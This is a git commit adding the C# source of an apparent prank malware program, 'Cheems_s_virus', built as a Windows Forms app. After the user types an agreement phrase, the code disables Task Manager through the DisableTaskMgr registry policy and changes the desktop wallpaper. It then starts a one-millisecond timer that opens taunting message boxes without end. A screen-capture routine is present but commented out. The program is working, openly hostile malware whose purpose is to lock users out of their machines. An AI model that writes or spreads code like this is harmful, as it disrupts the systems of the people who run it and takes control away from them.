c410da3502bcc9a8f6f68410c1d745e965ad77fc
maybe meg idk <70862628+Ohmeg@users.noreply.github.com>
2021-08-23 00:24:46 +0100

    pp

---
+++ WARING/Form1.Designer.cs
@@ -0,0 +1,178 @@
+﻿
+namespace Cheems_s_virus
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.components = new System.ComponentModel.Container();
+            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
+            this.label1 = new System.Windows.Forms.Label();
+            this.label2 = new System.Windows.Forms.Label();
+            this.label3 = new System.Windows.Forms.Label();
+            this.label4 = new System.Windows.Forms.Label();
+            this.textBox1 = new System.Windows.Forms.TextBox();
+            this.button1 = new System.Windows.Forms.Button();
+            this.button2 = new System.Windows.Forms.Button();
+            this.timer1 = new System.Windows.Forms.Timer(this.components);
+            this.tmkiller = new System.Windows.Forms.Timer(this.components);
+            this.timer2 = new System.Windows.Forms.Timer(this.components);
+            this.SuspendLayout();
+            // 
+            // label1
+            // 
+            this.label1.AutoSize = true;
+            this.label1.BackColor = System.Drawing.Color.Transparent;
+            this.label1.Font = new System.Drawing.Font("Microsoft YaHei", 14.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.label1.ForeColor = System.Drawing.Color.Transparent;
+            this.label1.Location = new System.Drawing.Point(146, 21);
+            this.label1.Name = "label1";
+            this.label1.Size = new System.Drawing.Size(255, 26);
+            this.label1.TabIndex = 0;
+            this.label1.Text = " WARING THS IS A VIRUS";
+            // 
+            // label2
+            // 
+            this.label2.AutoSize = true;
+            this.label2.BackColor = System.Drawing.Color.Transparent;
+            this.label2.Font = new System.Drawing.Font("Microsoft Sans Serif", 11.25F, System.Drawing.FontStyle.Italic, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.label2.ForeColor = System.Drawing.Color.Transparent;
+            this.label2.Location = new System.Drawing.Point(12, 68);
+            this.label2.Name = "label2";
+            this.label2.Size = new System.Drawing.Size(555, 18);
+            this.label2.TabIndex = 1;
+            this.label2.Text = "After you agree to the terms and conditions i will not fall liable to any damages" +
+    " done \r\n";
+            // 
+            // label3
+            // 
+            this.label3.AutoSize = true;
+            this.label3.BackColor = System.Drawing.Color.Transparent;
+            this.label3.Font = new System.Drawing.Font("Microsoft Sans Serif", 15.75F, System.Drawing.FontStyle.Italic, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.label3.ForeColor = System.Drawing.Color.Transparent;
+            this.label3.Location = new System.Drawing.Point(53, 107);
+            this.label3.Name = "label3";
+            this.label3.Size = new System.Drawing.Size(488, 25);
+            this.label3.TabIndex = 2;
+            this.label3.Text = "To agree for the payloads to be active you MUST \r\n";
+            // 
+            // label4
+            // 
+            this.label4.AutoSize = true;
+            this.label4.BackColor = System.Drawing.Color.Transparent;
+            this.label4.Font = new System.Drawing.Font("Microsoft Sans Serif", 14.25F, System.Drawing.FontStyle.Italic, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.label4.ForeColor = System.Drawing.Color.Transparent;
+            this.label4.Location = new System.Drawing.Point(6, 150);
+            this.label4.Name = "label4";
+            this.label4.Size = new System.Drawing.Size(566, 48);
+            this.label4.TabIndex = 3;
+            this.label4.Text = "type cheems-i-agree also this wil agree to the terms and conditions\r\n\r\n";
+            // 
+            // textBox1
+            // 
+            this.textBox1.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Italic, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.textBox1.Location = new System.Drawing.Point(151, 190);
+            this.textBox1.Name = "textBox1";
+            this.textBox1.Size = new System.Drawing.Size(254, 26);
+            this.textBox1.TabIndex = 4;
+            // 
+            // button1
+            // 
+            this.button1.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Italic, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.button1.Location = new System.Drawing.Point(302, 250);
+            this.button1.Name = "button1";
+            this.button1.Size = new System.Drawing.Size(136, 46);
+            this.button1.TabIndex = 5;
+            this.button1.Text = "Contiune";
+            this.button1.UseVisualStyleBackColor = true;
+            this.button1.Click += new System.EventHandler(this.button1_Click);
+            // 
+            // button2
+            // 
+            this.button2.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Italic, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.button2.Location = new System.Drawing.Point(124, 250);
+            this.button2.Name = "button2";
+            this.button2.Size = new System.Drawing.Size(136, 46);
+            this.button2.TabIndex = 6;
+            this.button2.Text = "End this process";
+            this.button2.UseVisualStyleBackColor = true;
+            this.button2.Click += new System.EventHandler(this.button2_Click);
+            // 
+            // timer1
+            // 
+            this.timer1.Interval = 1;
+            this.timer1.Tick += new System.EventHandler(this.timer1_Tick);
+            // 
+            // tmkiller
+            // 
+            this.tmkiller.Enabled = true;
+            this.tmkiller.Interval = 1;
+            this.tmkiller.Tick += new System.EventHandler(this.tmkiller_Tick);
+            // 
+            // timer2
+            // 
+            this.timer2.Interval = 1000;
+            this.timer2.Tick += new System.EventHandler(this.timer2_Tick);
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.BackgroundImage = global::Cheems_s_virus.Properties.Resources.a602e2c62d7f8452c94db01dd211016a;
+            this.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
+            this.ClientSize = new System.Drawing.Size(578, 321);
+            this.Controls.Add(this.button2);
+            this.Controls.Add(this.button1);
+            this.Controls.Add(this.textBox1);
+            this.Controls.Add(this.label4);
+            this.Controls.Add(this.label3);
+            this.Controls.Add(this.label2);
+            this.Controls.Add(this.label1);
+            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
+            this.Name = "Form1";
+            this.Text = "WARING: This Cile Contain\'s a Virus Delete At Your Own Will";
+            this.Load += new System.EventHandler(this.Form1_Load);
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.Label label1;
+        private System.Windows.Forms.Label label2;
+        private System.Windows.Forms.Label label3;
+        private System.Windows.Forms.Label label4;
+        private System.Windows.Forms.TextBox textBox1;
+        private System.Windows.Forms.Button button1;
+        private System.Windows.Forms.Button button2;
+        private System.Windows.Forms.Timer timer1;
+        private System.Windows.Forms.Timer tmkiller;
+        private System.Windows.Forms.Timer timer2;
+    }
+}
+
---
+++ WARING/Form1.cs
@@ -0,0 +1,147 @@
+﻿using Microsoft.Win32;
+using Microsoft.VisualBasic;
+using OpenQA.Selenium.Interactions;
+using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Drawing.Imaging;
+using System.Linq;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using System.IO;
+
+namespace Cheems_s_virus
+{
+    public partial class Form1 : Form
+    {
+        public Form1()
+        {
+            InitializeComponent();
+        }
+
+
+        private void button2_Click(object sender, EventArgs e)
+        {
+            this.Close();
+        }
+
+        private void button1_Click(object sender, EventArgs e)
+        {
+            string cheemcheck = "cheems-i-agree";
+            if (textBox1.Text == cheemcheck)
+            {
+                MessageBox.Show("welmp no restworing this nowm");
+                this.Hide();
+                scatter();
+            }
+        }
+        private void scatter()
+        {
+            payloadorder();
+        }
+
+
+        private void payloadorder()
+        {
+            //Order of payloads to run
+            //1:
+            tmkill();
+            //2:
+            bye();
+            //3:
+            tunnelmode();
+            //4:
+            windowspam();
+            //5:
+            Screen();
+            //6
+            windowserror();
+        }
+
+        private void bye()
+        {
+            MessageBox.Show("Task Manger Is Gone PFF so will alt+f4 and ctrl+alt+delete");
+        }
+       
+        private void tunnelmode()
+        {
+            /*Rectangle bounds = Screen.GetBounds(Point.Empty);
+            using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
+            {
+                using (Graphics g = Graphics.FromImage(bitmap))
+                {
+                    g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
+                }
+                bitmap.Save("test.jpg", ImageFormat.Jpeg);
+            }*/
+        }
+
+        private void windowspam()
+        {
+            string photo = @"C:/cheems.jpg";
+            DisplayPicture(photo);
+        }
+
+        [DllImport("user32.dll", SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        static extern bool SystemParametersInfo(uint uiAction, uint uiParam, String pvParam, uint fWinIni);
+
+        private const uint SPI_SETDESKWALLPAPER = 0x14;
+        private const uint SPIF_UPDATEINIFILE = 0x1;
+        private const uint SPIF_SENDWININICHANGE = 0x2;
+
+        private static void DisplayPicture(string file_name)
+        {
+            uint flags = 0;
+            if (!SystemParametersInfo(SPI_SETDESKWALLPAPER,
+                    0, file_name, flags))
+            {
+                Console.WriteLine("Error");
+            }
+            
+        }
+        private void windowserror()
+        {
+            timer1.Enabled = true;
+        }
+
+        private void Screen()
+        {
+            
+        }
+
+        private void timer1_Tick(object sender, EventArgs e)
+        {
+            MessageBox.Show("HAHAHA Cheems now owns you No esscape now");
+        }
+
+        private void tmkiller_Tick(object sender, EventArgs e)
+        {
+            
+        }
+
+        private static void tmkill()
+        {
+            RegistryKey regkey;
+            string keyValueInt = "1";
+            string subKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
+            regkey = Registry.CurrentUser.CreateSubKey(subKey);
+            regkey.SetValue("DisableTaskMgr", keyValueInt);
+            regkey.Close();
+        }
+
+        private void timer2_Tick(object sender, EventArgs e)
+        {
+            
+        }
+
+        private void Form1_Load(object sender, EventArgs e)
+        {
+          
+        }
+    }
+}
